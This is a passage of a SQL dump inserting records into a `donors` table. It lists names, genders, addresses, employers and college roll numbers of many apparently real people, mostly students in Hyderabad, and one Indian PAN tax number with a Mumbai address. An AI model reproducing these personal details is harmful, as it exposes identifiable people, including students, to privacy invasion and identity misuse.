(134, '2', 'Sudha ', 'Singh', NULL, 'F', '1-11-110/12/B,Shyamlal,Begumpet,Hyderabad.', 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Ms Sudha', NULL, 'ABS', NULL, NULL, 0),
(135, '2', 'Mahesh', 'P', NULL, 'M', '6/21,Borodipate,Guntur', 'Guntur', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mahesh', NULL, '', NULL, NULL, 0),
(136, '2', 'Pramod', 'Sandhireddy', NULL, 'M', 'Somgigudaa, Hyderabad', 'Hyedrabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Pramod', NULL, 'Sandhireddy', NULL, NULL, 0),
(137, '2', 'Venkatraman', 'Balakrishnan', NULL, 'M', '', 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Venkatraman B', NULL, 'Infosys', NULL, NULL, 0),
(138, '1', 'Ramachandra Rao', 'Roddam', NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Multiple Donors', NULL, 'Multiple Donors', NULL, NULL, 0),
(139, '2', 'Ramesh', 'Krisnhamurthy', NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Ramesh Krishnamurthy', NULL, 'ABS', NULL, NULL, 0),
(140, '2', 'Pushpak', NULL, NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Pushpak', NULL, 'ABS', NULL, NULL, 0),
(141, '2', 'Pavani', NULL, NULL, 'F', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Ms. Pavani', NULL, 'ABS', NULL, NULL, 0),
(142, '2', 'Sanjay Kumar', 'Patidar', '0000-00-00', 'M', 'Aman STD go;mhor ka bagicha ', 'Indore', 'Madhya Pradesh', 'India', '452001', '', '', '', '', '', '', '', '', '', 'Mr. Sanjay Kumar ', '', '', '', '', 0),
(143, '2', 'Praveen', 'Patel', '0000-00-00', 'M', 'Siddhart nagar ', 'Indore', 'Madhya Pradesh', 'India', '452001', '', '', '', '', '', '', '', '', '', 'Mr. Praveen Patel', '', '', '', '', 0),
(144, '2', 'Dilip ', 'Sahu', '0000-00-00', 'M', 'Shivdham Colony ', 'Indore', 'Madhya Pradesh', 'India', '452001', '', '', '', '', '', '', '', '', '', 'Mr. Dilip Sahu ', '', '', '', '', 0),
(145, '2', 'Yamini ', 'Jaware', '0000-00-00', 'F', 'Alok Nagar kanadiaya road', 'Indore', 'Madhya Pradesh', 'India', '452001', '', '', '', '', '', '', '', '', '', 'Ms. Yamini Jaware', '', '', '', '', 0),
(146, '2', 'Pankaj', 'Khandelwal ', '0000-00-00', 'M', 'Navlakha ', 'Indore', 'Madhya Pradesh', 'India', '452001', '', '', '', '', '', '', '', '', '', 'Mr. Pankaj Khandelwal', '', '', '', '', 0),
(147, '2', 'Ankit', 'Kumar', NULL, 'M', 'Hamidganj, Daltonganj\n', 'Palamu', 'Jharkhand', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Ankit Kumar', NULL, '', NULL, NULL, 0),
(148, '1', 'Tanvi', 'Kulkarni', NULL, 'F', 'Serene County, Gachibowli', 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Rotary Club of Cyberabad', NULL, 'Rotary Club of Cyberabad', NULL, NULL, 0),
(149, '2', 'Prafful', 'Saha', NULL, 'M', NULL, 'Indore', 'Madhya Pradesh', 'India', NULL, '', 'Bank Manager', '', '', '', '', NULL, NULL, NULL, 'Mr. Prafful Saha', NULL, 'Bank of Baroda', NULL, NULL, 0),
(150, '1', 'Shrigopal', 'Jagtap', NULL, 'M', NULL, 'Indore', 'Madhya Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Silver Spring Township Residents', NULL, 'Silver Spring Township Residents', NULL, NULL, 0),
(151, '1', 'Shrigopal', 'Jagtap', NULL, 'M', NULL, 'Indore', 'Madhya Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'SunCity Residents', NULL, 'SunCity Residents', NULL, NULL, 0),
(152, '1', 'Shrigopal', 'Jagtap', NULL, 'M', NULL, 'Indore', 'Madhya Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'MahalaxmiNagar Residents', NULL, 'MahalaxmiNagar Residents', NULL, NULL, 0),
(153, '1', 'Deepak Kumar', 'Sahu', NULL, 'M', NULL, 'Indore', 'Madhya Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Kalindi Kunj Residents', NULL, 'Kalindi Kunj Residents', NULL, NULL, 0),
(155, '2', 'Sanjay', 'Kumar', NULL, 'M', NULL, 'Indore', 'Mahdya Pradesh', NULL, NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Sanjay Kumar', NULL, 'Indian Grameen Services', NULL, NULL, 0),
(156, '2', 'Ramesh', 'Reddy', NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Ramesh Reddy', NULL, 'Oracle', NULL, NULL, 0),
(157, '2', 'Kaushik', 'Shivaswamy', NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Kaushik', NULL, 'Innogarage', NULL, NULL, 0),
(158, '2', 'Pallavi ', 'Seth', NULL, 'F', NULL, 'Bhopal', 'Madhya Pradesh', NULL, NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Ms. Pallavi', NULL, 'TFI', NULL, NULL, 0),
(159, '2', 'Tarun', 'Joshi', NULL, 'M', NULL, 'Indore', 'Madhya Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Tarun Joshi', NULL, 'TFI', NULL, NULL, 0),
(160, '2', 'Sunder', 'V', NULL, 'M', 'Hill Ridge Springs, Gachibowli', 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Sunder', NULL, 'TCS', NULL, NULL, 0),
(161, '2', 'Keerthi', NULL, NULL, 'F', 'Trendset Towers, Gachibowli', 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Ms. Keerthi', NULL, NULL, NULL, NULL, 0),
(162, '1', 'Deepak', 'Sahu', NULL, 'M', NULL, 'Indore', 'Madhya Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Shivdham Colony Residents', NULL, 'Shivdham Colony Residents', NULL, NULL, 0),
(163, '2', 'Chaitanya', 'Juluru', NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Chaitanya Juluru', NULL, 'Invesco', NULL, NULL, 0),
(164, '2', 'Amarnath', 'J', NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Amarnath J', NULL, 'BASIX', NULL, NULL, 0),
(165, '2', 'Srihari', 'Boregowda', NULL, 'M', NULL, 'Bangalore', 'Karnataka', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Srihari B', NULL, NULL, NULL, NULL, 0),
(166, '2', 'Anjan Kumar', 'Bose', NULL, 'M', '61-62, VINRITA, Prof. Almeida Road, Bandra-West', 'Mumbai', 'Maharashtra', 'India', '400050', '', NULL, '', '', '', '', 'ADWPB1298C', NULL, NULL, 'Mr. Anjan Kumar Bose', NULL, NULL, NULL, NULL, 0),
(167, '2', 'Srikanth ', 'L', NULL, 'M', NULL, 'Bangalore', 'Karnataka', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Srikanth L', NULL, NULL, NULL, NULL, 0),
(168, '2', 'Vamsi Krishna', 'S', '0000-00-00', 'M', '1051-10-468-033', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Vamsi Krishna S', '', 'ADC', '', 'MPCs-3', 0),
(169, '2', 'Anurag Kaushik', 'C', '0000-00-00', 'M', '1051-11-468-015', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Anurag Kaushik C', '', 'ADC', '', 'MPCS-2 A', 0),
(170, '2', 'Varsha Takur', 'K', '0000-00-00', 'F', '1051-11-467-072', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Varsha Takur K', '', 'ADC', '', 'MSCs-2 B', 0),
(171, '2', 'Lavanya', 'V Reddy', '0000-00-00', 'F', '1051-11-467-098', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Lavanya V Reddy', '', 'ADC', '', 'MSCs-2 B', 0),
(172, '2', 'Neethi ', 'Ajmera', '0000-00-00', 'F', '1051-11-467-057', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Neethi  Ajmera', '', 'ADC', '', 'MSCs-2 A', 0),
(173, '2', 'Varsha ', '', '0000-00-00', 'F', '1051-11-467-009', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Varsha  ', '', 'ADC', '', 'MSCs-2 A', 0),
(174, '2', 'Sumith', 'P', '0000-00-00', 'M', '1051-11-468-044', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Sumith P', '', 'ADC', '', 'MPCS-2 ', 0),
(175, '2', 'Praveen ', 'G Kumar', '0000-00-00', 'M', '1051-11-468-022', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Praveen  G Kumar', '', 'ADC', '', 'MPCS-2 ', 0),
(176, '2', 'Saiteja', 'P', '0000-00-00', 'M', '1051-11-468-028', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Saiteja P', '', 'ADC', '', 'MPCS-2 ', 0),
(177, '2', 'Mounika', 'M', '0000-00-00', 'F', '1051-11-468-007', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Mounika M', '', 'ADC', '', 'MPCS-2 ', 0),
(178, '2', 'Saikanth', 'J', '0000-00-00', 'M', '1051-11-468-032', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Saikanth J', '', 'ADC', '', 'MPCS-2 ', 0),
(179, '2', 'Jitesh', 'A', '0000-00-00', 'M', '1051-11-468-003', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Jitesh A', '', 'ADC', '', 'MPCS-2 ', 0),
(180, '2', 'Manisha', 'K', '0000-00-00', 'F', '1051-11-468-021', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Manisha K', '', 'ADC', '', 'MPCS-2 ', 0),
(181, '2', 'Adilshah', '', '0000-00-00', 'M', '1051-11-474-086', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Adilshah ', '', 'ADC', '', 'MECs-2B', 0),
(182, '2', 'Monika', '', '0000-00-00', 'F', '1051-11-467-012', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Monika ', '', 'ADC', '', 'MSCs-2A', 0),
(183, '2', 'Santhoshi', 'D', '0000-00-00', 'F', '1051-11-474-028', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Santhoshi D', '', 'ADC', '', 'MECs-2A', 0),
(184, '2', 'Pranitha', 'P Y', '0000-00-00', 'F', '1051-11-474-018', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Pranitha P Y', '', 'ADC', '', 'MECs-2A', 0),
(185, '2', 'Gundu Nikhila', '', '0000-00-00', 'F', '1051-11-474-044', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Gundu Nikhila ', '', 'ADC', '', 'MECs-2A', 0),
(186, '2', 'Sai Nikhil', 'G S', '0000-00-00', 'M', '1051-11-474-040', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Sai Nikhil G S', '', 'ADC', '', 'MECs-2A', 0),
(187, '2', 'Vishal', 'K', '0000-00-00', 'M', '1051-11-468-014', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Vishal K', '', 'ADC', '', 'MPCS-2', 0),
(188, '2', 'Goutam', 'Madana ', '0000-00-00', 'M', '1051-11-467-085', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Goutam Madana ', '', 'ADC', '', 'MSCs-2 B', 0),
(189, '2', 'Bharath', 'Bonagiri', '0000-00-00', 'M', '1051-11-468-084', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Bharath Bonagiri', '', 'ADC', '', 'MSCs-2 B', 0),
(190, '2', 'Druva', '', '0000-00-00', 'M', '1051-11-467-063', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Druva ', '', 'ADC', '', 'MSCs-2 B', 0),
(191, '2', 'Kusuma', '', '0000-00-00', 'F', '1051-11-459-000', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Kusuma ', '', 'ADC', '', 'MIGC-2', 0),
(192, '2', 'Vijay', 'Kanth', '0000-00-00', 'M', '1051-11-471-019', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Vijay Kanth', '', 'ADC', '', 'MIBiC', 0),
(193, '2', 'Mounika', '', '0000-00-00', 'F', '1051-11-471-018', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Mounika ', '', 'ADC', '', 'MIGC', 0),
(194, '2', 'Sai Raja Sailesh', 'Valiveti', '0000-00-00', 'M', '1051-11-474-017', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Sai Raja Sailesh Valiveti', '', 'ADC', '', 'MECs-2A', 0),
(195, '2', 'Srinivasa Anil Kumar', 'Golla', '0000-00-00', 'M', '1051-11-474-006', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Srinivasa Anil Kumar Golla', '', 'ADC', '', 'MECs-2A', 0),
(196, '2', 'Tanuja ', 'M Devnani', '0000-00-00', 'F', '1051-11-474-019', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Tanuja  M Devnani', '', 'ADC', '', 'MECs-2A', 0),
(197, '2', 'Vanamala', 'K A S', '0000-00-00', 'F', '1051-11-474-011', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Vanamala K A S', '', 'ADC', '', 'MECs-2A', 0),
(198, '2', 'Sinsi', 'Pichika', '0000-00-00', 'F', '1051-11-467-070', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Sinsi Pichika', '', 'ADC', '', 'MSCs-2 B', 0),
(199, '2', 'Aparna', 'Panjala', '0000-00-00', 'F', '1051-11-467-069', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Aparna Panjala', '', 'ADC', '', 'MSCs-2 B', 0),
(200, '2', 'Vishnu', '', '0000-00-00', 'M', '1051-11-467-002', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Vishnu ', '', 'ADC', '', 'MSCs-2A', 0),
(201, '2', 'Thakur Thuljaram Singh', '', '0000-00-00', 'M', '1051-11-467-011', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Thakur Thuljaram Singh ', '', 'ADC', '', 'MSCs-2A', 0),
(202, '2', 'Saikumar', 'A Reddy', '0000-00-00', 'M', '1051-11-468-035', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Saikumar A Reddy', '', 'ADC', '', 'MPCs-2', 0),
(203, '2', 'Srilalitha', 'Chandarala', '0000-00-00', 'F', '1051-11-467-050', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Srilalitha Chandarala', '', 'ADC', '', 'MSCs-2B', 0),
(204, '2', 'Shravani', 'Nakidi', '0000-00-00', 'F', '1051-11-467-087', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Shravani Nakidi', '', 'ADC', '', 'MSCs-2B', 0),
(205, '2', 'Bhargav', '', '0000-00-00', 'M', '1051-11-401-084', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Bhargav ', '', 'ADC', '', 'B.com(reg)2C', 0),
(206, '2', 'Deepakshah', '', '0000-00-00', 'M', '1051-11-401-110', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Deepakshah ', '', 'ADC', '', 'B.com(reg)2C', 0),
(207, '2', 'Kaushik', '', '0000-00-00', 'M', '1051-11-401-076', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Kaushik ', '', 'ADC', '', 'B.com(reg)2C', 0),
(208, '2', 'Surrender', '', '0000-00-00', 'M', '1051-11-401-126', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Surrender ', '', 'ADC', '', 'B.com(reg)2C', 0),
(209, '2', 'Riyashah', '', '0000-00-00', 'F', '1051-11-401-127', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Riyashah ', '', 'ADC', '', 'B.com(reg)2C', 0),
(210, '2', 'Deepali ', 'loya', '0000-00-00', 'F', '1051-11-401-139', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Deepali  loya', '', 'ADC', '', 'B.com(reg)2C', 0),
(211, '2', 'Sofia ', 'Banu', '0000-00-00', 'F', '1051-11-459-002', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Sofia  Banu', '', 'ADC', '', 'Mi.G.C-2', 0),
(212, '2', 'Trapti ', 'Gupta', '0000-00-00', 'F', '1051-11-471-005', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Trapti  Gupta', '', 'ADC', '', 'Mi.Bi.C-2', 0),
(213, '2', 'Sanjana ', 'Patange', '0000-00-00', 'F', '1051-11-459-023', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Sanjana  Patange', '', 'ADC', '', 'Mi.G.C-2', 0),
(214, '2', 'Swaroop', '', '0000-00-00', 'M', '1051-11-459-013', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Swaroop ', '', 'ADC', '', 'Mi.G.C-2', 0),
(215, '2', 'Sumitra', 'J', '0000-00-00', 'F', '1051-11-459-015', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Sumitra J', '', 'ADC', '', 'Mi.G.C-2', 0),
(216, '2', 'Adarsh', '', '0000-00-00', 'M', '1051-11-471-009', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Adarsh ', '', 'ADC', '', 'Mi.Bi.C-2', 0),
(217, '2', 'Rohan', '', '0000-00-00', 'M', '1051-11-488-005', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Rohan ', '', 'ADC', '', 'Bt.BI.C-2', 0),
(218, '2', 'Rewathi', '', '0000-00-00', 'F', '1051-11-402-108', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Rewathi ', '', 'ADC', '', 'B.com-2B', 0),
(219, '2', 'Dipika', '', '0000-00-00', 'F', '1051-11-402-125', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Dipika ', '', 'ADC', '', 'B.com-2B', 0),
(220, '2', 'Salman', '', '0000-00-00', 'M', '1051-11-402-080', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Salman ', '', 'ADC', '', 'B.com-2B', 0),
(221, '2', 'Chandrakala', 'P', '0000-00-00', 'F', 'F-001', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Chandrakala P', '', 'ADC', '', 'Faculty', 0),
(222, '2', 'Durga Prasad', 'Reddy', '0000-00-00', 'M', '1051-11-402-079', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Durga Prasad Reddy', '', 'ADC', '', 'B.com-2B', 0),
(223, '2', 'Rahul', '', '0000-00-00', 'M', '1051-11-402-082', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Rahul ', '', 'ADC', '', 'B.com-2B', 0),
(224, '2', 'Aneesha', '', '0000-00-00', 'F', '1051-11-402-069', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Aneesha ', '', 'ADC', '', 'B.com-2B', 0),
(225, '2', 'Shraddha', '', '0000-00-00', 'F', '1051-11-402-085', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Shraddha ', '', 'ADC', '', 'B.com-2B', 0),
(226, '2', 'Kavya', '', '0000-00-00', 'F', '1051-11-402-072', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Kavya ', '', 'ADC', '', 'B.com-2B', 0),
(227, '2', 'Soundarya', '', '0000-00-00', 'F', '1051-11-402-111', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Soundarya ', '', 'ADC', '', 'B.com-2B', 0),
(228, '2', 'Naveena', '', '0000-00-00', 'F', '1051-11-402-106', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Naveena ', '', 'ADC', '', 'B.com-2B', 0),
(229, '2', 'Sheetal', '', '0000-00-00', 'F', '1051-11-402-105', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Sheetal ', '', 'ADC', '', 'B.com-2B', 0),
(230, '2', 'Sirisha', '', '0000-00-00', 'F', '1051-10-407-052', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Sirisha ', '', 'ADC', '', 'B.com(Hon)-3', 0),
(231, '2', 'Prema', '', '0000-00-00', 'F', '1051-11-407-078', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Prema ', '', 'ADC', '', 'B.com-2B', 0),
(232, '2', 'Bhavya', '', '0000-00-00', 'F', '1051-11-402-123', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Bhavya ', '', 'ADC', '', 'B.com-2B', 0),
(233, '2', 'Surabhi', '', '0000-00-00', 'F', '1051-11-407-081', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Surabhi ', '', 'ADC', '', 'B.com-2B', 0),
(234, '2', 'Pooja Rethi', '', '0000-00-00', 'F', '1051-11-407-092', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Pooja Rethi ', '', 'ADC', '', 'B.com-2B', 0),
(235, '2', 'Monik Gupta', '', '0000-00-00', 'F', '1051-11-407-132', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Monik Gupta ', '', 'ADC', '', 'B.com-2B', 0),
(236, '2', 'Jayasree Nair', '', '0000-00-00', 'F', '1051-11-474-060', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Jayasree Nair ', '', 'ADC', '', 'MECs-2B', 0),
(237, '2', 'Sangeetha Reddy', '', '0000-00-00', 'F', '1051-11-474-118', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Sangeetha Reddy ', '', 'ADC', '', 'MECs-2B', 0);
INSERT INTO `donors` (`donor_id`, `type_of_donor`, `first_name`, `last_name`, `dob`, `gender`, `address`, `village_town`, `state`, `country`, `pin_code`, `occupation`, `title_designation`, `mobile_phone_no`, `personal_e_mail_id`, `official_e_mail_id`, `preferred_email`, `pan`, `feature_permission`, `feature_quote`, `displayname`, `donor_img`, `org_grp_name`, `org_grp_type`, `org_grp_description`, `user_id`) VALUES
(238, '2', 'Pravalika', '', '0000-00-00', 'F', '1051-11-474-078', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Pravalika ', '', 'ADC', '', 'MECs-2B', 0),
(239, '2', 'Nikitha Naram', '', '0000-00-00', 'F', '1051-11-474-074', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Nikitha Naram ', '', 'ADC', '', 'MECs-2B', 0),
(240, '2', 'Harika Reddy', '', '0000-00-00', 'F', '1051-11-474-115', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Harika Reddy ', '', 'ADC', '', 'MECs-2B', 0),
(241, '2', 'Rabi Adhkari', '', '0000-00-00', 'F', '1051-11-474-096', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Rabi Adhkari ', '', 'ADC', '', 'MECs-2B', 0),
(242, '2', 'Gayatri surya prashanthi', '', '0000-00-00', 'F', '1051-11-474-066', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Gayatri surya prashanthi ', '', 'ADC', '', 'MECs-2B', 0),
(243, '2', 'Gowrisree', '', '0000-00-00', 'F', '1051-11-474-068', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Gowrisree ', '', 'ADC', '', 'MECs-2B', 0),
(244, '2', 'Nishchala', 'T', '0000-00-00', 'F', '', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Nishchala T', '', 'St.Francis  College for Women', '', '', 0),
(245, '2', 'Mounika Krishna', '', '0000-00-00', 'F', '', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Mounika Krishna ', '', 'St.Francis  College for Women', '', '', 0),
(246, '2', 'Sree Ramya', 'M', '0000-00-00', 'F', '', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Sree Ramya M', '', 'St.Francis  College for Women', '', '', 0),
(247, '2', 'Zeeshan Ahmed', '', '0000-00-00', 'M', '', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Zeeshan Ahmed ', '', 'Indian Institute of Management and Commerce', '', '', 0),
(248, '2', 'Phani', 'K', '0000-00-00', 'M', '', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Phani K', '', '', '', '', 0),
(249, '2', 'Sanjuna', '', '0000-00-00', 'F', '', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Sanjuna ', '', 'Stanley College of Engineering and Tech for Women', '', '', 0),
(250, '2', 'Jyothi', 'N', '0000-00-00', 'F', '', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Jyothi N', '', 'Malla Reddy College Of Engineering', '', '', 0),
(251, '2', 'Sneha', 'M', '0000-00-00', 'F', '', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Sneha M', '', 'Nobel College of Engineering', '', '', 0),
(252, '2', 'Roma', '', '0000-00-00', 'F', '', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Roma ', '', 'St.Pious Degree College', '', '', 0),
